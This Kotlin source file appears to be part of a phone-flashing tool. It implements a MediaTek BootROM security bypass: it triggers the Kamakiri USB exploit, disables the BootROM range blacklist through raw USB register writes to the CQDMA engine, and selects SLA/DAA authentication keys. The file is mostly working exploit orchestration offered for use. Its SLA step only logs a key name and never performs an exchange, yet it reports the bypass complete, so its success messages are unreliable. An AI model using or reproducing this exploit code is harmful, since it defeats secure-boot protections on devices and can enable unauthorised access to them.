package com.example.protocol

import com.example.model.LogLevel
import com.example.model.MtkChipInfo
import com.example.model.OperationProgress
import com.example.model.TerminalLog
import kotlinx.coroutines.delay
import java.nio.ByteBuffer
import java.nio.ByteOrder

/**
 * MediaTek Security Bypass Engine (Kamakiri + CQDMA)
 * Real hardware operations only.
 */
class MtkSecurityBypassEngine(
    private val usb: TargetPhoneUsbManager,
    private val logCallback: (TerminalLog) -> Unit,
    private val progressCallback: (OperationProgress) -> Unit
) {

    private fun log(message: String, level: LogLevel = LogLevel.INFO) {
        logCallback(TerminalLog("", message, level))
    }

    /**
     * Executes the complete SLA / DAA / SBC Authentication Bypass.
     */
    suspend fun executeBypass(
        deviceInfo: MtkChipInfo?,
        isSimulation: Boolean = false
    ): Result<Boolean> {
        log("==================================================", LogLevel.WARNING)
        log(">>> [SECURITY BYPASS] SLA / DAA / SBC Auth Bypass", LogLevel.WARNING)
        log("==================================================", LogLevel.INFO)

        val hwCodeInt = deviceInfo?.hwCodeHex?.removePrefix("0x")?.toIntOrNull(16) ?: 0x0766
        val chipConfig = MtkChipConfigDatabase.findConfig(hwCodeInt)
            ?: MtkChipConfigDatabase.findConfig(0x0766)!!

        log("Target Chipset: ${chipConfig.name} (${chipConfig.description}) [HWCode: 0x%04X]".format(chipConfig.hwCode), LogLevel.INFO)
        log("Watchdog Address: 0x%08X | CQDMA Base: 0x%08X".format(
            chipConfig.watchdog,
            chipConfig.cqdmaBase
        ), LogLevel.INFO)

        try {
            // STEP 1: Deploy Kamakiri USB Exploit directly (BROM is already synced)
            log("[1/3] Deploying Kamakiri USB Exploit...", LogLevel.INFO)
            val kamakiri = MtkKamakiriExploit(usb) { msg, lvl -> log(msg, lvl) }
            val var1Val = chipConfig.var1
            val kamakiriOk = kamakiri.exploitKamakiri(var1Val)
            if (!kamakiriOk) {
                log("[-] Kamakiri exploit failed.", LogLevel.ERROR)
                return Result.failure(IllegalStateException("Kamakiri exploit failed"))
            }

            // STEP 2: CQDMA Blacklist Patching
            log("[2/3] Patching BootROM Range Blacklist via CQDMA registers...", LogLevel.INFO)
            val cqdma = MtkCqdmaEngine(
                read32Func = { addr ->
                    val cmdBuf = ByteBuffer.allocate(9).order(ByteOrder.BIG_ENDIAN)
                    cmdBuf.put(0xD6.toByte())
                    cmdBuf.putInt((addr and 0xFFFFFFFFL).toInt())
                    cmdBuf.putInt(1)
                    usb.writeRaw(cmdBuf.array(), 300)
                    val ack = ByteArray(2)
                    usb.readRaw(ack, 300)
                    val rx = ByteArray(4)
                    val read = usb.readRaw(rx, 300)
                    if (read >= 4) {
                        ByteBuffer.wrap(rx).order(ByteOrder.LITTLE_ENDIAN).int.toLong() and 0xFFFFFFFFL
                    } else 0L
                },
                write32Func = { addr, value ->
                    val cmdBuf = ByteBuffer.allocate(9).order(ByteOrder.BIG_ENDIAN)
                    cmdBuf.put(0xD4.toByte())
                    cmdBuf.putInt((addr and 0xFFFFFFFFL).toInt())
                    cmdBuf.putInt(1)
                    usb.writeRaw(cmdBuf.array(), 300)
                    val ack = ByteArray(2)
                    usb.readRaw(ack, 300)
                    val valBuf = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN).putInt((value and 0xFFFFFFFFL).toInt()).array()
                    usb.writeRaw(valBuf, 300)
                    val post = ByteArray(2)
                    usb.readRaw(post, 300)
                    true
                },
                logCallback = { msg, lvl -> log(msg, lvl) }
            )
            val cqdmaSuccess = cqdma.disableRangeBlacklist(chipConfig)
            if (cqdmaSuccess) {
                log("[+] CQDMA Blacklist successfully unlocked.", LogLevel.SUCCESS)
            }

            // STEP 3: SLA / DAA Key Handling
            log("[3/3] Handling SLA/DAA Key Verification...", LogLevel.INFO)
            handleSlaChallenge(chipConfig)

            log("==================================================", LogLevel.SUCCESS)
            log("SECURITY BYPASS COMPLETED: SLA/DAA/SBC Auth Bypassed.", LogLevel.SUCCESS)
            log("==================================================", LogLevel.SUCCESS)

            return Result.success(true)
        } catch (e: Exception) {
            log("[-] Security Bypass Error: ${e.message}", LogLevel.ERROR)
            return Result.failure(e)
        }
    }

    private fun handleSlaChallenge(config: ChipConfig) {
        val matchedKey = MtkSlaKeyDatabase.DA_SLA_KEYS.find { it.daCodes.contains(config.hwCode) }
            ?: MtkSlaKeyDatabase.BROM_SLA_KEYS.firstOrNull()

        if (matchedKey != null) {
            log("[SLA] Using keyring: '${matchedKey.name}' (${matchedKey.vendor})", LogLevel.INFO)
        } else {
            log("[SLA] Standard auth bypass confirmed for this chipset.", LogLevel.INFO)
        }
    }
}
